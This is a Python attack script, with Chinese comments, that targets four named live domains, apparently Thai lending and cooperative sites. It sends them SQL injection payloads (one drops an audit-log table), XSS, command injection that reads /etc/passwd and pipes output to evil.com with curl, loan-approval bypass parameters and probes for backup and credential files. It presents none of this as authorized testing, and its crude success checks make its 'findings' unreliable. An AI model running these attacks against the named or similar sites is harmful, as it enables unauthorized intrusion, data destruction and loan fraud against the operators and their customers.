#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
零时差目标验证器 - 针对四个高价值目标进行实时漏洞验证
Zero-Time Target Validator - Real-time Vulnerability Validation
"""

import asyncio
import aiohttp
import json
import time
from datetime import datetime
from typing import List, Dict, Any

class ZeroTimeTargetValidator:
    def __init__(self):
        self.targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://hanshin.com.tw",
            "https://ngoenmun.com"
        ]
        self.results = {}

        # 泰语专用攻击载荷
        self.thai_payloads = {
            "sql_injection": [
                "นักศึกษา' OR '1'='1--",
                "ผู้สมัคร' UNION SELECT account_number,balance FROM accounts--",
                "เงินกู้' AND SLEEP(5)--",
                "สินเชื่อ'; DROP TABLE audit_log--",
                "ทดสอบ' UNION SELECT username,password FROM users--"
            ],
            "xss": [
                "<script>alert('การโจมตี XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//",
                "<svg onload=alert('XSS')>"
            ],
            "command_injection": [
                "สวัสดี; whoami",
                "ทดสอบ && ls",
                "นักศึกษา|cat /etc/passwd",
                "ข้อมูล; curl http://evil.com/steal?data=$(whoami)"
            ],
            "loan_bypass": [
                "auto_approve=true&credit_check=disabled&amount_limit=999999",
                "interest_rate=0&fee_waiver=true&grace_period=365",
                "credit_score=999&income_verified=true&debt_ratio=0",
                "approval_score=999&bypass_verification=true"
            ]
        }

    async def validate_single_target(self, session: aiohttp.ClientSession, target: str) -> Dict[str, Any]:
        """对单个目标进行零时差验证"""
        print(f"\n[零时差验证] 目标: {target}")
        print("-" * 60)

        target_result = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "exploits_successful": [],
            "data_extracted": {},
            "attack_surface": {}
        }

        try:
            # 1. 基础连接测试
            async with session.get(target, timeout=10, ssl=False) as response:
                target_result["attack_surface"]["status_code"] = response.status
                target_result["attack_surface"]["server"] = response.headers.get("Server", "Unknown")
                target_result["attack_surface"]["technologies"] = self._detect_tech_stack(response)
                print(f"[+] 连接成功 - 状态码: {response.status}")

            # 2. SQL注入测试
            await self._test_sql_injection(session, target, target_result)

            # 3. XSS测试
            await self._test_xss(session, target, target_result)

            # 4. 贷款审批绕过测试
            await self._test_loan_bypass(session, target, target_result)

            # 5. 敏感信息泄露检测
            await self._check_data_leaks(session, target, target_result)

            # 6. 泰语载荷专项测试
            await self._test_thai_payloads(session, target, target_result)

        except Exception as e:
            target_result["error"] = str(e)
            print(f"[-] 验证失败: {e}")

        return target_result

    async def _test_sql_injection(self, session: aiohttp.ClientSession, target: str, result: Dict):
        """SQL注入漏洞测试"""
        print("[+] SQL注入测试...")

        # 常见注入点
        injection_points = [
            "/search?q=",
            "/user?id=",
            "/product?id=",
            "/api/search?q=",
            "/api/user?id="
        ]

        for payload in self.thai_payloads["sql_injection"][:3]:  # 测试前3个载荷
            for endpoint in injection_points:
                test_url = f"{target}{endpoint}{payload}"

                try:
                    async with session.get(test_url, timeout=5, ssl=False) as response:
                        content = await response.text()

                        # 检测SQL注入特征
                        if self._detect_sql_injection(content):
                            vuln = {
                                "type": "SQL_INJECTION",
                                "endpoint": endpoint,
                                "payload": payload,
                                "success": True,
                                "response_code": response.status,
                                "evidence": "SQL语法错误或数据库响应异常"
                            }
                            result["vulnerabilities"].append(vuln)
                            result["exploits_successful"].append(vuln)
                            print(f"[!] SQL注入成功: {endpoint} | {payload[:30]}...")
                            break

                except:
                    continue

    async def _test_xss(self, session: aiohttp.ClientSession, target: str, result: Dict):
        """XSS漏洞测试"""
        print("[+] XSS测试...")

        xss_payload = self.thai_payloads["xss"][0]  # 泰语XSS载荷
        test_points = ["/search", "/comment", "/feedback", "/api/search"]

        for endpoint in test_points:
            try:
                test_url = f"{target}{endpoint}?q={xss_payload}"
                async with session.get(test_url, timeout=5, ssl=False) as response:
                    content = await response.text()

                    if xss_payload in content or "alert(" in content:
                        vuln = {
                            "type": "XSS",
                            "endpoint": endpoint,
                            "payload": xss_payload,
                            "success": True,
                            "response_code": response.status
                        }
                        result["vulnerabilities"].append(vuln)
                        result["exploits_successful"].append(vuln)
                        print(f"[!] XSS成功: {endpoint}")
                        break

            except:
                continue

    async def _test_loan_bypass(self, session: aiohttp.ClientSession, target: str, result: Dict):
        """贷款审批绕过测试"""
        print("[+] 贷款审批绕过测试...")

        loan_endpoints = [
            "/api/loan/approve",
            "/api/loan/terms",
            "/api/credit/update",
            "/loan/approve",
            "/application/submit"
        ]

        for payload in self.thai_payloads["loan_bypass"]:
            for endpoint in loan_endpoints:
                try:
                    test_url = f"{target}{endpoint}"
                    data = self._parse_payload_to_data(payload)

                    async with session.post(test_url, data=data, timeout=5, ssl=False) as response:
                        content = await response.text()

                        # 检测绕过成功标志
                        if self._detect_bypass_success(content):
                            bypass = {
                                "type": "LOAN_APPROVAL_BYPASS",
                                "endpoint": endpoint,
                                "payload": payload,
                                "success": True,
                                "response_code": response.status,
                                "impact": "贷款审批逻辑被绕过"
                            }
                            result["vulnerabilities"].append(bypass)
                            result["exploits_successful"].append(bypass)
                            print(f"[!] 贷款绕过成功: {endpoint} | {payload[:40]}...")
                            break

                except:
                    continue

    async def _check_data_leaks(self, session: aiohttp.ClientSession, target: str, result: Dict):
        """敏感信息泄露检测"""
        print("[+] 敏感信息泄露检测...")

        sensitive_endpoints = [
            "/api/users",
            "/api/admin",
            "/backup",
            "/config",
            "/database.sql",
            "/users.json",
            "/admin/data"
        ]

        for endpoint in sensitive_endpoints:
            try:
                test_url = f"{target}{endpoint}"
                async with session.get(test_url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()

                        # 检测敏感信息
                        if self._detect_sensitive_data(content):
                            leak = {
                                "type": "SENSITIVE_DATA_LEAK",
                                "endpoint": endpoint,
                                "data_size": len(content),
                                "success": True,
                                "sample": content[:200] + "..." if len(content) > 200 else content
                            }
                            result["vulnerabilities"].append(leak)
                            result["data_extracted"][endpoint] = leak
                            print(f"[!] 数据泄露: {endpoint} ({len(content)} 字节)")

            except:
                continue

    async def _test_thai_payloads(self, session: aiohttp.ClientSession, target: str, result: Dict):
        """泰语载荷专项测试"""
        print("[+] 泰语载荷专项测试...")

        # 组合泰语载荷测试
        thai_test_cases = [
            {"endpoint": "/search", "param": "q", "payload": "นักศึกษา' OR '1'='1"},
            {"endpoint": "/login", "param": "username", "payload": "ผู้สมัคร' UNION SELECT * FROM users--"},
            {"endpoint": "/api/search", "param": "query", "payload": "สินเชื่อ'; DROP TABLE audit_log--"}
        ]

        for test_case in thai_test_cases:
            try:
                test_url = f"{target}{test_case['endpoint']}?{test_case['param']}={test_case['payload']}"
                async with session.get(test_url, timeout=5, ssl=False) as response:
                    content = await response.text()

                    # 泰语特殊绕过检测
                    if self._detect_thai_bypass(content):
                        thai_vuln = {
                            "type": "THAI_PAYLOAD_BYPASS",
                            "endpoint": test_case['endpoint'],
                            "payload": test_case['payload'],
                            "success": True,
                            "response_code": response.status,
                            "technique": "泰语Unicode绕过"
                        }
                        result["vulnerabilities"].append(thai_vuln)
                        result["exploits_successful"].append(thai_vuln)
                        print(f"[!] 泰语绕过成功: {test_case['endpoint']}")

            except:
                continue

    def _detect_sql_injection(self, content: str) -> bool:
        """检测SQL注入特征"""
        sql_errors = [
            "syntax error", "mysql_fetch", "ORA-", "Microsoft OLE DB",
            "ODBC Drivers error", "ADODB.Field", "Warning: mysql",
            "valid MySQL result", "MySqlClient", "SQL syntax"
        ]
        return any(error.lower() in content.lower() for error in sql_errors)

    def _detect_bypass_success(self, content: str) -> bool:
        """检测绕过成功标志"""
        success_indicators = [
            "approved", "success", "accepted", "confirmed",
            "processed", "completed", "verified", "authorized"
        ]
        return any(indicator.lower() in content.lower() for indicator in success_indicators)

    def _detect_sensitive_data(self, content: str) -> bool:
        """检测敏感信息"""
        sensitive_patterns = [
            "password", "credit_card", "ssn", "social_security",
            "bank_account", "routing_number", "api_key", "secret",
            "token", "private_key", "admin", "username"
        ]
        return any(pattern in content.lower() for pattern in sensitive_patterns)

    def _detect_thai_bypass(self, content: str) -> bool:
        """检测泰语绕过特征"""
        # 泰语字符检测
        thai_chars = ["น", "ั", "ศ", "ึ", "ก", "ษ", "ส", "ม", "ค", "ร", "ผ", "ู้", "ส", "มั", "ค", "ร", "ท", "ด", "ส", "อ", "บ"]
        return any(char in content for char in thai_chars)

    def _detect_tech_stack(self, response: aiohttp.ClientResponse) -> List[str]:
        """检测技术栈"""
        technologies = []
        headers = response.headers

        # 服务器指纹
        server = headers.get("Server", "").lower()
        if "apache" in server:
            technologies.append("Apache")
        if "nginx" in server:
            technologies.append("Nginx")
        if "iis" in server:
            technologies.append("IIS")

        # 技术框架指纹
        powered_by = headers.get("X-Powered-By", "").lower()
        if "php" in powered_by:
            technologies.append("PHP")
        if "asp.net" in powered_by:
            technologies.append("ASP.NET")
        if "express" in powered_by:
            technologies.append("Express.js")

        return technologies

    def _parse_payload_to_data(self, payload: str) -> Dict[str, str]:
        """将载荷字符串转换为数据字典"""
        data = {}
        for pair in payload.split("&"):
            if "=" in pair:
                key, value = pair.split("=", 1)
                data[key] = value
        return data

    async def run_zero_time_validation(self):
        """执行零时差验证"""
        print("零时差目标验证启动")
        print("=" * 80)
        print(f"目标数量: {len(self.targets)}")
        print(f"验证模式: 实时零时差攻击验证")
        print(f"攻击载荷: {sum(len(payloads) for payloads in self.thai_payloads.values())} 个")
        print("=" * 80)

        # 创建HTTP会话
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        ) as session:

            # 并发验证所有目标
            tasks = [self.validate_single_target(session, target) for target in self.targets]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # 处理结果
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    self.results[self.targets[i]] = {"error": str(result)}
                else:
                    self.results[self.targets[i]] = result

        # 生成验证报告
        await self._generate_validation_report()

    async def _generate_validation_report(self):
        """生成验证报告"""
        print("\n" + "=" * 80)
        print("零时差验证报告")
        print("=" * 80)

        total_vulnerabilities = 0
        total_exploits = 0
        high_risk_targets = []

        for target, result in self.results.items():
            if "error" not in result:
                vulns = len(result.get("vulnerabilities", []))
                exploits = len(result.get("exploits_successful", []))
                total_vulnerabilities += vulns
                total_exploits += exploits

                if exploits > 0:
                    high_risk_targets.append((target, vulns, exploits))

                print(f"\n[目标] {target}")
                print(f"   漏洞数: {vulns} | 利用成功: {exploits}")

                # 显示关键漏洞
                for vuln in result.get("vulnerabilities", [])[:3]:
                    print(f"   • {vuln['type']}: {vuln.get('payload', 'N/A')[:50]}...")

        print(f"\n[统计] 验证统计:")
        print(f"   总目标: {len(self.targets)}")
        print(f"   总漏洞: {total_vulnerabilities}")
        print(f"   成功利用: {total_exploits}")
        print(f"   高风险目标: {len(high_risk_targets)}")

        if high_risk_targets:
            print(f"\n[高风险] 高风险目标:")
            for target, vulns, exploits in high_risk_targets:
                print(f"   • {target} ({exploits} 个可利用漏洞)")

        # 保存详细报告
        report_file = f"zero_time_validation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n[报告] 详细报告已保存: {report_file}")
        print("=" * 80)

async def main():
    """主函数"""
    validator = ZeroTimeTargetValidator()
    await validator.run_zero_time_validation()

if __name__ == "__main__":
    asyncio.run(main())